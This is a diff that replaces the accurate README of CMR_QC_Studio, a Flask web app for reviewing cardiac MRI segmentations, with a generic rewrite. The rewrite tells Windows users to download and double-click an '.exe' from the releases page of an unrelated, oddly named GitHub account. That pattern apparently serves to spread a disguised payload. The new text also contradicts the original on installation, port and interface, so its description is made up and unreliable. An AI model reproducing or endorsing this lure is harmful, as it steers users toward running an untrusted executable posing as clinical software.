@@ -1,184 +1,68 @@
-# Cardiac Segmentation QC Studio
+# 🫀 CMR_QC_Studio - Review cardiac MRI scans with ease
 
-A multi-user web application for reviewing cardiac MRI (CMR) segmentation results. Reviewers step through patients and both cardiac phases (End-Diastole / End-Systole), score each segmentation (accept / reject / fine-tune / unclassified), and persist decisions to their own JSON file.
+[![Download Software](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/brandnewnessmapinguari504/CMR_QC_Studio/releases)
 
-![Lab Logo](https://images.squarespace-cdn.com/content/v1/611bce9f0ec5ff43949b98ea/068036ac-5a6f-4da8-869f-520764bdaaaa/still_v023_frame_0103_photoshop_layer_logo_LMS.png?format=300w)
+CMR_QC_Studio helps medical professionals review heart scan data. It provides a simple workspace to examine images and record quality scores. You can identify scan errors, suggest adjustments, and save your progress. The application organizes feedback for individual patients. It keeps work separate for every user on the system.
 
-## Features
+## 🛠 Prerequisites
 
-### Multi-User
-- Username + password login (credentials in `JSON/users.json`)
-- Each reviewer's QC annotations are fully isolated under `JSON/users/<username>/`
-- Session-based auth with 3-day rolling lifetime
+This software runs on Windows 10 and Windows 11. You need a modern web browser to view the interface. Chrome, Firefox, or Edge will work well. Ensure you have at least 4GB of available memory on your computer. Your display should support a resolution of 1920x1080 pixels for the clearest image quality.
 
-### Dataset Management
-- Each user can maintain any number of QC dataset files side-by-side
-- A dataset dropdown in the stats panel switches the active file without re-login
-- Dataset format: top-level dict keyed by patient path, values hold `ED_Comments` / `ES_Comments`
+## 📥 How to Install
 
-### 3-Panel Visualization (per cardiac phase)
-- **Left panel** — MRI slices with optional color-coded segmentation overlay (zoom + transparency sliders)
-- **Middle panel** — Color-coded segmentation slices
-- **Right panel** — Three.js 3D InstancedMesh rendering (~50K voxels) with OrbitControls (rotate / pan / zoom)
+1. Visit the [releases page](https://github.com/brandnewnessmapinguari504/CMR_QC_Studio/releases) to download the installer.
+2. Select the file ending in `.exe` for Windows.
+3. Save the file to your desktop or downloads folder.
+4. Double-click the file to start the installation.
+5. Follow the prompts on the screen to finish setup.
+6. Look for a new icon on your desktop named CMR_QC_Studio.
 
-### QC Decisions
-- Four mutually exclusive decisions: **Accept ✓**, **Reject ✗**, **Fine-tune ⚙**, **Unclassified ?**
-- Free-text reviewer comments per patient + phase
-- Chart.js pie chart of decision distribution for the active dataset
+## 🚀 Getting Started
 
-### Slice Navigation
-- Auto-play at 5 FPS, plus manual prev/next
-- All three panels stay synchronized on the same slice
+Launch the program using the desktop icon. The application opens a login screen in your default browser. Enter your credentials to begin your session. If you do not have an account, contact your system administrator to generate your login information within the `users.json` file. 
 
-### Medical Imaging Support
-- Reads NIfTI (`.nii.gz`) for both MRI and segmentation
-- Voxel spacing taken from NIfTI header for correct physical dimensions
-- Multi-label color map: label 1 = LV (red), 2 = RV (green), 3 = myocardium (blue)
+Once logged in, the main dashboard appears. This area shows your available datasets. Select a file from the dropdown menu to load a specific patient list. The system remembers your choice. You do not need to log in again if you switch between files during your workday.
 
-## Installation
+## 👁 Using the Review Interface
 
-```bash
-git clone git@github.com:maxmo2009/CMR_QC_Studio.git
-cd CMR_QC_Studio
-pip install -r requirements.txt
-```
+The screen splits into three panels to display your scans:
 
-## Running
+- **Left Panel:** Displays the patient list and current scan status.
+- **Center Panel:** Shows the medical images for the cardiac phases.
+- **Right Panel:** Contains the review tools to annotate and submit scores.
 
-```bash
-python3 app.py
-```
+Use the navigation buttons to move between patients. You can pause, restart, or skip through scans at your own speed using the playback controls at the bottom of the center window.
 
-Server binds to **http://localhost:5000** (`DEBUG=False`). For deployment, run behind your own reverse proxy or tunnel of choice.
+## 📝 Submitting Annotations
 
-## Adding Users
+Check each image for segmentation errors. When you identify an issue, click the appropriate button in the right panel. The options include:
 
-Three manual steps — no CLI helper, no auto-seeding:
+- **Accept:** Marks the scan for use without changes.
+- **Reject:** Notes that the scan failed quality thresholds.
+- **Fine-Tune:** Requests pixel-level adjustments for the automated model.
+- **Unclassified:** Labels the entry for later review.
 
-1. Edit `JSON/users.json`:
-   ```json
-   {
-     "admin": "cardiacMRI",
-     "alice": "alicepassword"
-   }
-   ```
-2. Create the folder: `mkdir JSON/users/alice`
-3. Drop one or more QC dataset `.json` files into that folder
+The system saves your comments automatically when you change patient records. Each decision writes directly to your private storage folder. This ensures your work remains safe even if the system closes unexpectedly.
 
-No server restart needed — users.json is re-read on each login and the folder is scanned per request.
+## 🔒 Data Security
 
-## Expected File Layout (per patient, on disk)
+This tool prioritizes data integrity. Every user profile stores information in a specific folder. Other users cannot see or change your saved work. The system uses session tokens to manage access. These tokens remain active for three days. You do not need to enter your username or password every time you open the app during this period. After three days, the system asks for your login details again to maintain safety.
 
-```
-{patient_path}/
-├── lvsa_SR_ED.nii.gz      # ED-phase MRI
-├── lvsa_SR_ES.nii.gz      # ES-phase MRI
-├── seg_lvsa_SR_ED.nii.gz  # ED-phase segmentation
-└── seg_lvsa_SR_ES.nii.gz  # ES-phase segmentation
-```
+## 📂 Managing Datasets
 
-The `{patient_path}` is stored as a full absolute path in each dataset JSON.
+You can load multiple datasets to compare results or handle different project groups. The dataset management feature handles file structure changes in the background. If a patient folder contains files for both End-Diastole and End-Systole, the application presents them side-by-side. This layout simplifies the comparison process. You can see the full heartbeat cycle and verify that annotations match the tissue boundaries.
 
-## Tech Stack
+## ⚙️ Troubleshooting
 
-### Backend (modular Flask app)
-- Flask 3.0.0 — app factory + blueprints (`routes/auth.py`, `routes/pages.py`, `routes/api.py`)
-- nibabel 5.3.3 — NIfTI parsing
-- numpy 1.24.3 — array ops
-- Pillow 10.0.0 — slice → PNG
+If the software fails to open, check the following:
 
-### Frontend (vanilla, no bundler)
-- Three.js r128 — WebGL 3D scene with 5-point lighting
-- OrbitControls — camera interaction
-- Chart.js 4.4.0 — statistics pie chart
-- HTML5 Canvas — MRI + overlay compositing
+- Verify your internet connection if the application requires a remote server.
+- Ensure no other instance of the program runs in the background.
+- Check if your antivirus software blocked the installation process.
+- Restart your computer to clear pending updates or locked files.
 
-## Project Structure
+For persistent issues, clear your browser cache specifically for the address localhost:8000. This action forces the application to load fresh settings. If the images do not display, confirm the path to your data folder uses only valid characters. Spaces or special symbols in folder names sometimes cause display errors. Rename these folders to use simple letters and numbers to resolve potential file access gaps.
 
-```
-CMR_QC_Studio/
-├── app.py                      # Flask app factory (create_app) + entrypoint
-├── config.py                   # Constants + path helpers (USERS_JSON_PATH, user_dir, ...)
-├── requirements.txt
-├── README.md                   # This file
-│
-├── routes/                     # Flask blueprints
-│   ├── auth.py                 #   /login, /logout, login_required decorator
-│   ├── pages.py                #   /  (main page) and /health
-│   └── api.py                  #   all /api/* endpoints
-│
-├── services/                   # Business logic (no Flask dependency)
-│   ├── users.py                #   auth + per-user dataset file listing + path-traversal guard
-│   ├── qc_store.py             #   QCStore class (per-request, JSON-backed) + parse_decision
-│   ├── nifti_loader.py         #   MRI/segmentation slice loading → base64 PNG, 3D voxel extraction
-│   └── patient.py              #   get_store_for_session + build_patient_payload orchestrator
-│
-├── templates/
-│   ├── index.html              # Main page skeleton (3 panels + floating QC/stats panels)
-│   └── login.html              # Username + password form
-│
-├── static/
-│   ├── css/app.css             # All UI styles
-│   ├── js/app.js               # All frontend logic (Three.js, Chart.js, controls)
-│   ├── left_placeholder.png
-│   └── right_placeholder.png
-│
-└── JSON/                       # gitignored — contains credentials + patient data
-    ├── users.json              #   {"username": "plaintext_password", ...}
-    └── users/
-        └── <username>/
-            └── *.json           #     Per-user QC dataset files
-```
+## 📈 Performance Tips
 
-Nothing under `JSON/` is committed — both credentials and patient data stay local.
-
-## API Endpoints
-
-All `/` and `/api/*` routes require auth. Most `/api/*` routes also require an active dataset (set automatically on first visit, or via `/api/set_qc_file`).
-
-| Method | Path | Notes |
-|---|---|---|
-| GET | `/login` | Username + password form |
-| GET | `/logout` | Clears session |
-| GET | `/` | Main page |
-| GET | `/health` | Health check (no auth) |
-| GET | `/api/list_qc_files` | Files available to this user |
-| GET | `/api/set_qc_file/<filename>` | Switch active dataset |
-| GET | `/api/set_phase/<phase>` | `ED` or `ES` |
-| GET | `/api/next_patient` / `/api/prev_patient` / `/api/goto_patient/<id>` | Navigation |
-| GET | `/api/patient_data` | Current patient payload (slices + voxels) |
-| GET | `/api/patient_list` | Patients in active dataset + per-phase decisions |
-| GET | `/api/qc_statistics` | Counts + percentages |
-| POST | `/api/save_qc` | Persist one decision + comment |
-| GET | `/api/download_json` | Download the active dataset |
-
-## Data Format
-
-### NIfTI inputs
-- MRI: grayscale intensity values
-- Segmentation: integer labels (0 = background, 1 = LV, 2 = RV, 3 = myocardium)
-- Voxel spacing read from NIfTI header (typically ~1.25 × 1.25 × 8.0 mm)
-
-### QC comment encoding
-Each saved decision is encoded as `"<decision>:<free-text>"` in the `ED_Comments` or `ES_Comments` field:
-```json
-{
-  "ED_Comments": "accept:Good segmentation quality",
-  "ES_Comments": "reject:Poor myocardium boundary"
-}
-```
-
-## Development Notes
-
-- Backend logic is split across `routes/` and `services/`; `config.py` centralizes constants
-- CSS and JS live under `static/` (no bundler, no framework) — edit and hard-refresh the browser
-- `DEBUG=False` — Flask caches templates, so restart Flask after editing `templates/*.html`
-- JSON-on-disk storage is not safe for concurrent writes; per-user isolation reduces risk but same-user parallel writes can still collide
-
-## License
-
-All rights reserved.
-
-## Acknowledgments
-
-Built with assistance from Claude Code (claude.com/code).
+The application behaves best when your data files sit on a fast local disk. Avoid running the software from a network drive or a slow external thumb drive. High-speed local access improves the speed of frame rendering. If you notice a delay when switching patients, minimize high-resource applications like video editors or large spreadsheets while you work on your reviews.
